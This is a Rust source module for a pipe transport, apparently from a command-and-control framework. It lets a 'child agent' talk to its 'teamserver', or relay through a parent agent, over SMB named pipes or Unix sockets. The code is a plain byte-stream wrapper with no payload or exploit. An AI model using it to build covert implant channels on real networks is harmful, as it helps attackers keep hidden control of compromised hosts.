//! Named-pipe / Unix-socket client transport.
//!
//! Lets a child agent reach its teamserver (or a parent agent relaying to the
//! teamserver) through SMB named pipes on Windows, or Unix domain sockets on
//! Unix hosts. The stream is a plain byte transport; TLS and the end-to-end
//! session layer run on top unchanged.

use anyhow::{Context, Result};
use std::pin::Pin;
use std::task::{Context as TaskContext, Poll};
use tokio::io::{AsyncRead, AsyncWrite, ReadBuf};

pub enum PipeStream {
    #[cfg(unix)]
    Unix(tokio::net::UnixStream),
    #[cfg(windows)]
    Windows(tokio::net::windows::named_pipe::NamedPipeClient),
}

impl AsyncRead for PipeStream {
    fn poll_read(
        self: Pin<&mut Self>,
        cx: &mut TaskContext<'_>,
        buf: &mut ReadBuf<'_>,
    ) -> Poll<std::io::Result<()>> {
        match self.get_mut() {
            #[cfg(unix)]
            PipeStream::Unix(stream) => Pin::new(stream).poll_read(cx, buf),
            #[cfg(windows)]
            PipeStream::Windows(stream) => Pin::new(stream).poll_read(cx, buf),
        }
    }
}

impl AsyncWrite for PipeStream {
    fn poll_write(
        self: Pin<&mut Self>,
        cx: &mut TaskContext<'_>,
        buf: &[u8],
    ) -> Poll<std::io::Result<usize>> {
        match self.get_mut() {
            #[cfg(unix)]
            PipeStream::Unix(stream) => Pin::new(stream).poll_write(cx, buf),
            #[cfg(windows)]
            PipeStream::Windows(stream) => Pin::new(stream).poll_write(cx, buf),
        }
    }

    fn poll_flush(self: Pin<&mut Self>, cx: &mut TaskContext<'_>) -> Poll<std::io::Result<()>> {
        match self.get_mut() {
            #[cfg(unix)]
            PipeStream::Unix(stream) => Pin::new(stream).poll_flush(cx),
            #[cfg(windows)]
            PipeStream::Windows(stream) => Pin::new(stream).poll_flush(cx),
        }
    }

    fn poll_shutdown(self: Pin<&mut Self>, cx: &mut TaskContext<'_>) -> Poll<std::io::Result<()>> {
        match self.get_mut() {
            #[cfg(unix)]
            PipeStream::Unix(stream) => Pin::new(stream).poll_shutdown(cx),
            #[cfg(windows)]
            PipeStream::Windows(stream) => Pin::new(stream).poll_shutdown(cx),
        }
    }
}

/// Connects to a named pipe (`\\.\pipe\name` or `\\HOST\pipe\name`) on
/// Windows, or to a Unix domain socket path on Unix.
pub async fn connect(path: &str) -> Result<PipeStream> {
    #[cfg(unix)]
    {
        let stream = tokio::net::UnixStream::connect(path)
            .await
            .with_context(|| format!("failed to connect to socket {path}"))?;
        Ok(PipeStream::Unix(stream))
    }
    #[cfg(windows)]
    {
        let name = if path.starts_with(r"\\") {
            path.to_string()
        } else {
            format!(r"\\.\pipe\{path}")
        };
        let client = tokio::net::windows::named_pipe::ClientOptions::new()
            .open(&name)
            .with_context(|| format!("failed to connect to pipe {name}"))?;
        Ok(PipeStream::Windows(client))
    }
}
